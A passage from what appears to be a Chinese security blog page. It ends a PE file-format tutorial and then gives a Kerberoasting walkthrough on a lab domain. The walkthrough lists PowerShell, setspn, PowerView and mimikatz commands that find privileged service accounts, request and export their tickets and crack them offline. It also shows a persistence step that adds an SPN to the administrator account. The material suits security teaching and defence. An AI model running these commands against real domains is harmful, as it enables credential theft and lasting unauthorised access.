<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E7%B3%BB%E7%BB%9F%E8%A7%A3%E5%AF%86%E7%AF%87.assets/image-20211012210558148.png" alt="image-20211012210558148"></p>
</li>
</ul>
<p>另外，虚拟地址空间与物理地址空间并不是一个东西，不可以混为一谈，我们可以这么理解，我们c/c++程序中访问的内存地址，并不是实际上的物理内存地址，而是虚拟内存地址，程序访问内存地址时，先是访问虚拟地址，通过页表等手段将虚拟地址映射到物理内存地址上，如此进行间接的访问物理内存地址。并且由于每个程序都有自己的虚拟内存地址，其映射出的物理内存地址也不同，可通过此手段对内存地址进行隔离。</p>
<p>​    <strong>对于EXE文件来说</strong>，由于每个文件总是使用独立的虚拟地址空间，优先装入地址不可能被其他模块占据，所以EXE总是能按照此地址装入，这也意味着EXE文件不需重定位信息</p>
<p>​    <strong>对于DLL文件来说</strong>，由于多个DLL文件共享使用宿主EXE文件的地址空间，不能保证优先装入地址没有被其他的DLL使用，所以DLL文件必须包含重定位信息以防万一。因此前面的IMAGE_FILE_HEADER结构的Characteristics字段中，DLL文件对应的IMAGE_FILE_RELOCS_STRIPPED位总为0，而EXE文件的这个标志位总为1.</p>
<p>​    在链接的时候，可以通过对link.exe指定/base:address选项来自定义优先装入地址，如果不指定这个选项的话，一般EXE文件的默认优先装入地址被定位00400000h,而DLL文件的默认优先装入地址被定为10000000h。</p>
<ul>
<li><strong>SectionAlignment字段和FileAlignment字段</strong></li>
</ul>
<p>SectionAlignment字段制定了节被装入福内存后的对其单位。也就是说每个节被装入的地址必定是本字段指定数值的整数倍。而FileAligment字段制定了节存储在磁盘文件中时的对齐单位。</p>
<ul>
<li><p><strong>IMAGE_DATA_DIRECTORY [IMAGE_NUMBEROF_DIRECTORY_ENTRIES]</strong></p>
<p>这个字段可以说是最重要的字段之一，他由16个相同的IMAGE_DATA_DIRECTORY结构组成，虽然PE文件中的数据是按照装入内存后的页属性归类而被放在不同的节中的，但这些处于各个节中的数据按照用途可以分为导出表、导入表、资源、重定位表等数据块，这16个IMAGE_DATA_DIRECTORY结构就是用来定义多种不同用途的数据块的。IMAGE_DATA_DIRECTORY 结构定义比较简单，它仅仅指出了某种数据块的长度和位置。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DATA_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD VirtualAddress; <span class="comment">//数据的相对虚拟地址(RVA)</span></span><br><span class="line">    DWORD Size; <span class="comment">//数据的大小</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>各个数据目录列表的含义：</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E7%B3%BB%E7%BB%9F%E8%A7%A3%E5%AF%86%E7%AF%87.assets/image-20211012204106567.png" alt="image-20211012204106567"></p>
<p>在PE文件中找寻特定的数据时就是从这些IMAGE_DATA_DIRECTORY结构开始的，比如要存取资源，那么就必须从第三个IMAGE_DATA_DIRECTORY结构（索引为2）中获得资源数据块的大小和位置；同理，如果要查看PE文件导入了哪些DLL文件的那些API函数，那就必须首先从第二个IMAGE_DATA_DIRECTORY结构得到导入表的位置与大小。</p>
<h3 id="IMAGE-SECTION-HEADER结构"><a href="#IMAGE-SECTION-HEADER结构" class="headerlink" title="IMAGE_SECTION_HEADER结构"></a>IMAGE_SECTION_HEADER结构</h3><p>区块表（节表）：</p>
<p>PE文件中所有节的属性都被定义在节表中，节表由一系列的IMAGE_SECTION_HEADER结构排列而成，每个结构用来 描述一个节，结构的排列顺序和它们描述的节在文件中的排列顺序是一致的。全部有效结构的最后以一个空的IMAGE_SECTION_HEADER结构作为 结束，所以节表中总的IMAGE_SECTION_HEADER结构数量等于节的数量加一。节表总是被存放在紧接在PE文件头的地方。<br>另外，节表中 IMAGE_SECTION_HEADER 结构的总数总是由PE文件头 IMAGE_NT_HEADERS 结构中的 FileHeader.NumberOfSections 字段来指定的。</p>
<p>此结构体共占40个字节</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span> </span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">+<span class="number">0</span>h BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; <span class="comment">// 节表名称,如“.text” </span></span><br><span class="line"><span class="comment">//IMAGE_SIZEOF_SHORT_NAME=8</span></span><br><span class="line"><span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">+8<span class="title">h</span> &#123;</span></span><br><span class="line">DWORD PhysicalAddress; <span class="comment">// 物理地址</span></span><br><span class="line">DWORD VirtualSize; <span class="comment">// 真实长度，这两个值是一个联合结构，可以使用其中的任何一个，一</span></span><br><span class="line"><span class="comment">// 般是取后一个</span></span><br><span class="line">&#125; Misc;</span><br><span class="line">+ch DWORD VirtualAddress; <span class="comment">// 节区的 RVA 地址</span></span><br><span class="line">+<span class="number">10</span>h DWORD SizeOfRawData; <span class="comment">// 在文件中对齐后的尺寸</span></span><br><span class="line">+<span class="number">14</span>h DWORD PointerToRawData; <span class="comment">// 在文件中的偏移量</span></span><br><span class="line">+<span class="number">18</span>h DWORD PointerToRelocations; <span class="comment">// 在OBJ文件中使用，重定位的偏移</span></span><br><span class="line">+<span class="number">1</span>ch DWORD PointerToLinenumbers; <span class="comment">// 行号表的偏移（供调试使用地）</span></span><br><span class="line">+<span class="number">1</span>eh WORD NumberOfRelocations; <span class="comment">// 在OBJ文件中使用，重定位项数目</span></span><br><span class="line">+<span class="number">20</span>h WORD NumberOfLinenumbers; <span class="comment">// 行号表中行号的数目</span></span><br><span class="line">+<span class="number">24</span>h DWORD Characteristics; <span class="comment">// 节属性如可读，可写，可执行等&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span></span><br></pre></td></tr></table></figure>

<p><strong>Name： 区块名</strong>。这是一个由8位的ASCII  码名，用来定义区块的名称。多数区块名都习惯性以一个“.”作为开头（例如：.text），这个“.”  实际上是不是必须的。值得我们注意的是，如果区块名超过 8 个字节，则没有最后的终止标志“NULL” 字节。并且前边带有一个“$”  的区块名字会从连接器那里得到特殊的待遇，前边带有“$” 的相同名字的区块在载入时候将会被合并，在合并之后的区块中，他们是按照“$”  后边的字符的字母顺序进行合并的。<br>另外每个区块的名称都是唯一的，不能有同名的两个区块。但事实上节的名称不代表任何含义，他的存在仅仅是为了正 规统一编程的时候方便程序员查看方便而设置的一个标记而已。所以将包含代码的区块命名为“.Data” 或者说将包含数据的区块命名为“.Code”  都是合法的。当我们要从PE 文件中读取需要的区块时候，不能以区块的名称作为定位的标准和依据，正确的方法是按照  IMAGE_OPTIONAL_HEADER32 结构中的数据目录字段结合进行定位。</p>
<ul>
<li><strong>Virtual Size:</strong> 该表对应的区块大小，这是区块的数据在没有进行对齐处理前的实际大小</li>
<li><strong>Virtual address:</strong> <strong>该区块装载到内存中的RVA 地址</strong>。这个地址是按照内存页来对齐的，因此它的数值总是 SectionAlignment  的值的整数倍。在Microsoft 工具中，第一个快的默认 RVA 总为1000h。在OBJ 中，该字段没有意义地，并被设为0。</li>
<li><strong>SizeOfRawData:</strong> 该区块在磁盘中所占的大小。在可执行文件中，该字段的大小是已经被FileAlignment进行对齐过的长度。(FileAlignment 是磁盘中PE文件对齐标准的字段，默认大小为200h，SectionAlignment 是内存中PE文件对齐标准的字段，默认大小为1000h )</li>
<li><strong>PointerToRawData: 该区块在磁盘中的偏移。</strong> 这个数值是从文件头开始算起的偏移量 </li>
<li><strong>PointerToRelocations：</strong>这哥们在EXE文件中没有意义，<strong>在OBJ 文件中，表示本区块重定位信息的偏移值</strong>。（在OBJ 文件中如果不是零，它会指向一个IMAGE_RELOCATION 结构的数组）</li>
<li><strong>PointerToLinenumbers：行号表在文件中的偏移值</strong>，文件的调试信息，于我们没用，鸡肋。</li>
<li><strong>NumberOfRelocations：</strong>这哥们在EXE文件中也没有意义，<strong>在OBJ 文件中，是本区块在重定位表中的重定位数目</strong>来着。</li>
<li><strong>Characteristics：该区块的属性</strong>。该字段是按位来指出区块的属性（如代码/数据/可读/可写等）的标志。</li>
</ul>
<h3 id="区块描述、对齐值以及RVA详解"><a href="#区块描述、对齐值以及RVA详解" class="headerlink" title="区块描述、对齐值以及RVA详解"></a>区块描述、对齐值以及RVA详解</h3><p>通常，区块中的数据在逻辑上是关联的。PE  文件一般至少都会有两个区块：一个是代码块，另一个是数据块。每一个区块都需要有一个截然不同的名字，这个名字主要是用来表达区块的用途。例如有一个区块叫.rdata，表明他是一个只读区块。注意：区块在映像中是按起始地址（RVA）来排列的，而不是按字母表顺序。  </p>
<p>  另外，使用区块名字只是人们为了认识和编程的方便，而对操作系统来说这些是无关紧要的。微软给这些区块取了个有特色的名字，但这不是必须的。当编程从PE 文件中读取需要的内容时，如输入表、输出表，不能以区块名字作为参考，正确的方法是按照数据目录表中的字段来进行定位。  </p>
<p>  <strong>下表中的区块名称以及意义：</strong>  </p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E7%B3%BB%E7%BB%9F%E8%A7%A3%E5%AF%86%E7%AF%87.assets/634_82c_216.jpg" alt="634_82c_216"></p>
<p> 我们再Visual C++ 中也可以自己命名区块，用#pragma来声明， 告诉编译器插入数据到一个区块中，格式如下：</p>
<p>​    <strong>#pragma data_msg(“FC_data”)</strong></p>
<p>以上语句告诉编译器将数据全都放入”FC-data” 的区块中，而不是默认的.data区块内。区块一般是从obj文件开始，被编译器防止。链接器用于合并OBJ和库中需要的块，使其称为一个最终合适的区块。链接器会遵循一套相当完整的规则，他会判断哪些区块将被合并以及如何被合并。</p>
<p><strong>合并区块：</strong> 链接器可以合并区块。如果两个区块有相似、一致性的属性，那么他们在链接的时候能够被合并成一个单一的区块。这取决于编译器是否开启了/merge开关。由于区块存在对齐问题，如果PE文件中存在大量相似的区块而不进行合并，这样会对内存资源造成极大的浪费 *<em>注意：（我们不可以将.rsrc、.reloc、.pdata 合并到</em>***的区块中。</p>
<p>之前我们简单了解过区块是要对齐的，无论是在内存中存放还是在磁盘中存放~  但他们一般的对齐值是不同的。</p>
<p> PE 文件头里边的FileAligment 定义了磁盘区块的对齐值。每一个区块从对齐值的倍数的偏移位置开始存放。而区块的实际代码或数据的大小不一定刚好是这么多，所以在多余的地方一般以00h 来填充，这就是区块间的间隙。</p>
<p><strong>区块的对齐值</strong></p>
<p> 例如，在PE文件中，一个典型的对齐值是200h ，这样，每个区块都将从200h 的倍数的文件偏移位置开始，假设第一个区块在400h  处，长度为90h，那么从文件400h 到490h  为这一区块的内容，而由于文件的对齐值是200h，所以为了使这一区块的长度为FileAlignment 的整数倍，490h 到 600h  这一个区间都会被00h 填充，这段空间称为区块间隙，下一个区块的开始地址为600h 。</p>
<p> PE 文件头里边的SectionAligment 定义了内存中区块的对齐值。PE 文件被映射到内存中时，区块总是至少从一个页边界开始。</p>
<p> 一般在X86 系列的CPU 中，页是按4KB（1000h）来排列的；在IA-64 上，是按8KB（2000h）来排列的。所以在X86 系统中，PE文件区块的内存对齐值一般等于 1000h，每个区块按1000h 的倍数在内存中存放。</p>
<h3 id="PE文件到内存的映射"><a href="#PE文件到内存的映射" class="headerlink" title="PE文件到内存的映射"></a>PE文件到内存的映射</h3><h3 id="PE文件到内存的映射-1"><a href="#PE文件到内存的映射-1" class="headerlink" title="PE文件到内存的映射"></a>PE文件到内存的映射</h3><ul>
<li>在执行一个PE文件的时候，Windows并不是在一开始就将整个文件读入内存的，而是采用与内存映射文件类似的机制但又不完全相同；内存映射所写入物理内存中的文件与磁盘文件相比，相对位置完全相同，而Windows装载器装载的EXE等文件时，会产生重定位对某些数据进行预处理，装载到物理内存等待系统使用，使得磁盘文件与物理内存文件的相对位置不同。</li>
<li>也就是Windows装载器在装载的时候仅仅建立好了虚拟地址与PE文件之间的映射关系，与我上文写的一致。</li>
<li>当且仅当真正执行至某个内存页中的指令或访问某一页中的数据时，这个页面才会被从磁盘提交到物理内存之中，这种机制使得文件装入的速度和文件的大小并没有太大关系，而是与CPU关系大。</li>
<li>Windows装载器在装载DOS部分、PE文件头部分和区块表（节表）部分是不进行任何特殊处理的，而在装载节（区块）的时候则会自动对照区块表（节表）的属性做不同的处理</li>
<li>一般情况下，它会处理以下几个方面的内容：<ul>
<li>内存页的属性;</li>
<li>节的偏移地址;</li>
<li>节的尺寸;</li>
<li>不进行映射的节;</li>
</ul>
</li>
</ul>
<p><strong>内存页的属性</strong>：</p>
<p>对于磁盘映射文件来说，所有的页都是按照磁盘映射文件函数指定的属性来设置的。但是在装载可执行文件的时候，与节对应的内存页属性需要按照节的属性来设置。所以在同属于一个模块的内存页中，从不同节映射来的内存页的属性是不同的。</p>
<p><strong>节的偏移地址：</strong></p>
<p>节的起始地址在磁盘文件中是按照IMAGE_OPTIONAL_HEADER32结构的 FileAlignment 字段的值进行对齐，而当被加载到内存中时是按照同一结构的SectionAlignment 字段的值对齐的，两者的值可能不同，所以当一个节被装入内存后相对于文件头的偏移和在磁盘文件中的偏移可能是不同的。</p>
<p>这就是为什么PE文件在载入虚拟空间地址后偏移地址会发生比例改变的原因。</p>
<p>注意：<strong>节实际上就是相同属性数据的组合</strong> 当节被装入内存中时，相同一个内存所对应的内存页都将被赋予相同的页属性，实际上，windows系统对内存属性的设置时以页为单位进行的，所以节在内存中的对齐单位必须至少是一个页的大小。</p>
<p><strong>对于32位操作系统来说，这个值一般是4KB==1000H; 对于64位操作系统这个值一般是8KB==2000H）</strong></p>
<p><strong>当我们需要从PE文件中读取区块的时候，不能以区块的名称作为定位的标准或依据，正确的方法是按照IMAGE_OPTIONAL_HEADER32结构中的数据目录字段进行定位</strong></p>
<h2 id="实际操作展示"><a href="#实际操作展示" class="headerlink" title="实际操作展示"></a>实际操作展示</h2><h3 id="利用IMAGE-DOS-HEADER进行跳转"><a href="#利用IMAGE-DOS-HEADER进行跳转" class="headerlink" title="利用IMAGE_DOS_HEADER进行跳转"></a>利用IMAGE_DOS_HEADER进行跳转</h3><p>e_magic变量的值为0X4D5A 对应的MZ 即为DOS头部的标示，DOS可执行文件标示。</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E7%B3%BB%E7%BB%9F%E8%A7%A3%E5%AF%86%E7%AF%87.assets/image-20211012120145749.png" alt="image-20211012120145749"></p>
<p>利用e_lfanew使pe文件由DOS头位置跳转至PE文件头位置。</p>
<p>e_lfanew处的偏移量由于应该是高位地址在前，低位地址在后，顺序应颠倒-&gt;00 00 01 40 即 140h 此处偏移地址是根据基地址来看，因此应该是00 00 00 00 + 00 00 01 40 = 00 00 01 40</p>
<p>根据偏移地址可以找到140h 即为PE文件头的起始偏移量，加上基地址就可找到PE文件头的指针，来到PE文件头</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E7%B3%BB%E7%BB%9F%E8%A7%A3%E5%AF%86%E7%AF%87.assets/image-20211012120542254.png" alt="image-20211012120542254"></p>
<h3 id="找出IMAGE-NT-HEADERS中IMAGE-OPTIONAL-HEADER32的地址"><a href="#找出IMAGE-NT-HEADERS中IMAGE-OPTIONAL-HEADER32的地址" class="headerlink" title="找出IMAGE_NT_HEADERS中IMAGE_OPTIONAL_HEADER32的地址"></a>找出IMAGE_NT_HEADERS中IMAGE_OPTIONAL_HEADER32的地址</h3><p>利用IMAGE_FILE_HEADER结构中SizeOfOptionalHeader（+14h）找出IMAGE_OPTIONAL_HEADER32结构的大小。</p>
<p>根据PE头+14h可找到SizeOFoptionHeader的值0X00F0，转化为10进制可得出IMAGE_OPTIONAL_HEADER32结构大小为240</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E7%B3%BB%E7%BB%9F%E8%A7%A3%E5%AF%86%E7%AF%87.assets/image-20211013095656163.png" alt="image-20211013095656163"></p>
<p>其次，根据IMAGE_NT_HEADERS结构体的IMAGE_OPTIONAL_HEADER32（+18h）拿到IMAGE_OPTIONAL_HEADER32的起始地址</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E7%B3%BB%E7%BB%9F%E8%A7%A3%E5%AF%86%E7%AF%87.assets/image-20211013095854695.png" alt="image-20211013095854695"></p>
<p>利用起始地址+结构大小=整个结构 可知，IMAGE_OPTIONAL_HEADER32的结构的起始地址为158h结束地址为248h 第一次算没把158当成16进制，直接算错了(笑)</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E7%B3%BB%E7%BB%9F%E8%A7%A3%E5%AF%86%E7%AF%87.assets/image-20211013100616071.png" alt="image-20211013100616071"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PE%E7%BB%93%E6%9E%84/" rel="tag">PE结构</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
    <article id="post-Kerberoasting攻击" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2021/09/27/Kerberoasting%E6%94%BB%E5%87%BB/" class="article-date">
      <time datetime="2021-09-27T07:22:39.000Z" itemprop="datePublished">2021-09-27</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2021/09/27/Kerberoasting%E6%94%BB%E5%87%BB/">Kerberoasting</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>​    <strong>Kerberoasting的概念</strong></p>
<p>​    <strong>Kerberoasting的原理</strong></p>
<p>​    <strong>Kerberoasting的实现</strong></p>
<p>​    <strong>Kerberoasting后门利用</strong></p>
<h2 id="0x02-基本概念"><a href="#0x02-基本概念" class="headerlink" title="0x02 基本概念"></a>0x02 基本概念</h2><h3 id="一、SPN是什么"><a href="#一、SPN是什么" class="headerlink" title="一、SPN是什么:"></a>一、<strong>SPN是什么:</strong></h3><p>服务主题名称( SPN: Service Principal Names) 是服务实例， 可以将其理解为一个服务（比如HTTTP、MSSQL）的唯一标识符，服务在加入域中时是自动注册的。</p>
<p>如果在整个域或林中的计算机上安装多个服务实例，则每个实例都必须有自己的SPN。如果客户端可能使用多个名称进行身份验证，则给定服务实例可以具有多个SPN。SPN始终包含运行服务实例主机的名称，因此服务实例可以为其主机名称或别名注册SPN。如果想使用<strong>Kerberos</strong>协议进行认证服务，那必须正确配置SPN</p>
<h3 id="SPN分类"><a href="#SPN分类" class="headerlink" title="SPN分类:"></a><strong>SPN分类:</strong></h3><p><strong>1.注册在域内机器账户(computer)下</strong></p>
<p>当一个服务的权限为Local System 或 Network Service时，SPN会注册于域内机器账户下(Computers)</p>
<p><strong>注册在域内用户账户(User)下</strong></p>
<p>当一个服务的权限为一个域用户，则此时SPN注册在域用户账户下(Users)</p>
<h3 id="二、SPN标准格式"><a href="#二、SPN标准格式" class="headerlink" title="二、SPN标准格式"></a><strong>二、SPN标准格式</strong></h3><p>在 SPN 的语法中存在四种元素，两个必须元素和两个额外元素，其中和为必须元素:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;service class&gt;/&lt;host&gt;:&lt;port&gt;/&lt;service name&gt; accountname</span><br><span class="line">&lt;service class&gt; 	#标识服务类的字符串</span><br><span class="line">&lt;host&gt;	#服务所在主机名</span><br><span class="line">&lt;port&gt;	#服务端口</span><br><span class="line">&lt;service name&gt;	#服务名称</span><br><span class="line">accountname #注册账户名</span><br></pre></td></tr></table></figure>

<p>Serviceclass可以认为是服务名，常见的有www,ldap,http,dns等</p>
<p>host有两种形式，FQDN与NetBIOS名，例如Service1.redteam.com和service1</p>
<p>如果服务运行于默认端口上，可省略端口号</p>
<h3 id="三、查询SPN"><a href="#三、查询SPN" class="headerlink" title="三、查询SPN"></a>三、查询SPN</h3><p>利用setspn等手段对域控制器发起LDAP查询，是正常的Kerberos票据行为的一部分，因此很难被设备或筛选日志查询得到。</p>
<p><strong>1.使用SetSPN</strong></p>
<p>查看当前域内所有的SPN:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -q */*</span><br></pre></td></tr></table></figure>

<p>查看目标域内的SPN</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -t redteam -q */*</span><br></pre></td></tr></table></figure>

<p><img src="/../images/Kerberoasting%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0.assets/image-20210927155830466.png" alt="image-20210927155830466"></p>
<p>可以发现</p>
<p><strong>机器账户：</strong></p>
<ul>
<li><strong>CN=AD-2016,OU=Domain Controllers,DC=redteam,DC=com</strong></li>
<li><strong>CN=AD2-2016,OU=Domain Controllers,DC=redteam,DC=com</strong></li>
<li><strong>CN=WEB-2012,CN=Computers,DC=redteam,DC=com</strong></li>
<li><strong>CN=WEB-2003,CN=Computers,DC=redteam,DC=com</strong></li>
</ul>
<p><strong>域用户账户：</strong></p>
<ul>
<li><strong>CN=krbtgt,CN=Users,DC=redteam,DC=com</strong></li>
</ul>
<p><strong>注册于域用户下的SPN仅有一个：</strong></p>
<ul>
<li><strong>kadmin/changepw</strong></li>
</ul>
<h2 id="0x03-Kerberoasting的原理"><a href="#0x03-Kerberoasting的原理" class="headerlink" title="0x03 Kerberoasting的原理"></a>0x03 Kerberoasting的原理</h2><h3 id="一、-Kerberos认证过程"><a href="#一、-Kerberos认证过程" class="headerlink" title="一、 Kerberos认证过程"></a>一、 Kerberos认证过程</h3><ul>
<li>​    Kerberoasting 当域内某个用户去请求同域内的某个服务实例时，请求会首先被 送达至<strong>KDS</strong> 的 <strong>AS</strong> 中进行身份认证。</li>
<li>​    通过后 <strong>AS</strong> 会返回一个由用户密码<strong>hash</strong>加密而成的<strong>TGT</strong>票据给用户，然后用户再拿着<strong>TGT</strong>票据去请求<strong>TGS</strong>，<strong>TGS</strong>验证成功后会返回一个用对应服务账号的密码<strong>hash</strong>加密过**(RC4_HMAC_MD5)<strong>的票据</strong>TGS**</li>
<li>​    用户拿着<strong>TGS</strong>通过目标服务实例验证后可以去访问对应的服务资源，<strong>Kerberoasting</strong>攻击利用TGS票据加密算法已知这一条件，尝试穷举口令，对<strong>TGS</strong>进行对比，若<strong>TGS</strong>相同，则口令正确。得到对应服务实例的明文密码。</li>
</ul>
<h3 id="二、Windows系统通过SPN查询获得服务和服务实例账户的对应关系"><a href="#二、Windows系统通过SPN查询获得服务和服务实例账户的对应关系" class="headerlink" title="二、Windows系统通过SPN查询获得服务和服务实例账户的对应关系"></a>二、Windows系统通过SPN查询获得服务和服务实例账户的对应关系</h3><p>设用户a需要访问Mysql服务，进行到**Ticket Granting Server(TGS)**返还TGS票据时：</p>
<p><strong>1.Domain Controller查询Mysql服务的SPN</strong></p>
<p>如果该SPN注册在机器账户(<strong>Computers</strong>)，将会查询所有机器账户(<strong>Computers</strong>)的servicePrincipalName属性，查找对应的账户</p>
<p>如果该SPN注册在域用户账户(<strong>Users</strong>)，将会查询所有域用户账户(<strong>Users</strong>)的servicePrincipalName属性，查找对应的账户</p>
<p>**2.**找到对应的账户后，使用该账户的NTLM Hash，生成TGS票据</p>
<p><strong>3、域内的主机都能查询SPN</strong></p>
<p><strong>4、域内的任何用户都可以向域内的任何服务请求TGS</strong></p>
<p>综上，域内的任何一台主机，都能够通过查询SPN，向域内的所有服务请求TGS，拿到TGS后对其进行暴力破解。</p>
<p>对于破解的明文口令，只有域用户账户(Users)的口令存在价值，不必考虑机器账户的口令(无法用于远程连接)</p>
<p>利用思路如下：</p>
<ol>
<li>查询SPN，找到有价值的SPN，需要满足如下条件    <ul>
<li>SPN注册在域用户账户下(Users)</li>
<li>域用户账户的权限很高</li>
</ul>
</li>
<li>请求TGS</li>
<li>导出TGS</li>
<li>利用字典破解TGS拿到明文密码</li>
</ol>
<h2 id="0x04-Kerberoasting的实现方法一"><a href="#0x04-Kerberoasting的实现方法一" class="headerlink" title="0x04 Kerberoasting的实现方法一"></a>0x04 Kerberoasting的实现方法一</h2><h3 id="1、拿到有价值的SPN"><a href="#1、拿到有价值的SPN" class="headerlink" title="1、拿到有价值的SPN"></a><strong>1、拿到有价值的SPN</strong></h3><ul>
<li>注册于域用户账户(Users)下</li>
<li>域用户账户的权限很高</li>
</ul>
<p>1.<strong>使用Powershell模块Active Directory</strong></p>
<p>Actice Directory模块 需要提前安装，域控自带</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import-module ActiveDirectory</span><br><span class="line">get-aduser -filter &#123;AdminCount -eq 1 -and (servicePrincipalName -ne 0)&#125; -prop * |select name,whencreated,pwdlastset,lastlogon</span><br></pre></td></tr></table></figure>

<p>对于未安装Active Directory模块的系统，可以通过如下命令导入Active Directory模块：</p>
<p>dll文件可在github上自行下载</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll</span><br><span class="line">import-module .\Microsoft.ActiveDirectory.Management.dll</span><br></pre></td></tr></table></figure>

<p><strong>2.使用Powerview</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module Powerview.ps1</span><br><span class="line">Get-NetUser -spn -admincount | select name,whencreated,pwdlastset,lastlogon</span><br></pre></td></tr></table></figure>

<p><img src="/../images/Kerberoasting%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0.assets/image-20210927164313999.png" alt="image-20210927164313999"></p>
<p><strong>3.利用Kerberoast</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module GetUserSPNs.ps1</span><br></pre></td></tr></table></figure>

<p>列出所有域用户SPN</p>
<p><img src="/../images/Kerberoasting%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0.assets/image-20210927165832743.png" alt="image-20210927165832743"></p>
<h3 id="3、请求TGS票据"><a href="#3、请求TGS票据" class="headerlink" title="3、请求TGS票据"></a>3、请求TGS票据</h3><p><strong>1、请求指定TGS</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$SPNName=&#x27;kadmin/changepw&#x27;</span><br><span class="line">Add-Type -AssemblyNAme System.IdentityModel</span><br><span class="line">New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName</span><br></pre></td></tr></table></figure>

<p><strong>2、请求所有TGS</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Add-Type -AssemblyName System.IdentityModel  </span><br><span class="line">setspn.exe -q */* | Select-String &#x27;^CN&#x27; -Context 0,1 | % &#123; New-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() &#125;  </span><br></pre></td></tr></table></figure>

<p><img src="/../images/Kerberoasting%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0.assets/image-20210927170102406.png" alt="image-20210927170102406"></p>
<p>klist 查看内存中的票据，即可找到TGS</p>
<p><strong>3、导出</strong></p>
<p>使用mimikatz</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::list /export</span><br></pre></td></tr></table></figure>

<p>利用hashcat或kerberoast进行破解</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py 项目地址</span><br><span class="line">python2 tgsrepcrack.py password.txt  1-40a10000-administrator@kadmin~changepw-REDTEAM.COM.kirbi</span><br></pre></td></tr></table></figure>

<h2 id="0x06-Kerberoasting后门利用"><a href="#0x06-Kerberoasting后门利用" class="headerlink" title="0x06 Kerberoasting后门利用"></a>0x06 Kerberoasting后门利用</h2><p>当我们取得SPN的修改权限后，可以为指定的域用户添加一个SPN，这样可以随时获得该域用户的TGS，经过破解后获得明文口令</p>
<p>例如为域用户<strong>administrator</strong>添加SPN NC/dc.de1ay.com</p>
<p><img src="/../images/Kerberoasting%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0.assets/image-20210928100158925.png" alt="image-20210928100158925"></p>
